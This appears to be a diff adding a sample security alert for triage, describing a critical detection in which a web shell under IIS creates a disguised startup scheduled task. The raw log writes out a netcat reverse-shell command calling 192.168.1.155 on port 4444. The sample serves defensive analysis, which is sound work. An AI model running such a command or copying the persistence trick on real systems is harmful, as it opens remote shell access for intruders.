@@ -1,0 +1,24 @@
+Alert Metadata:
+Alert Name: Scheduled Task Created for Reverse Shell
+Severity: Critical
+Timestamp: 2026-07-18T17:05:00Z
+Sensor: SentinelOne
+
+Raw Log Data:
+event_type: "ScheduledTaskModification"
+timestamp: "2026-07-18T17:05:00Z"
+hostname: "SRV-WEB-88"
+action: "Create"
+task_name: "\\Microsoft\\Windows\\AppID\\UpdateAgent"
+command: "C:\\Windows\\System32\\cmd.exe"
+arguments: "/c C:\\Users\\Public\\nc.exe 192.168.1.155 4444 -e cmd.exe"
+trigger: "AtStartup"
+username: "IIS APPPOOL\\DefaultAppPool"
+
+Artifact Panel Context:
+
+Binary Identification: nc.exe is Netcat, a tool frequently used to establish reverse shells.
+
+Parent Process Context: The scheduled task was created via a web shell process running under the IIS worker process w3wp.exe.
+
+Network Connection: An active outbound connection on port 4444 to 192.168.1.155 was established immediately after the task triggered.
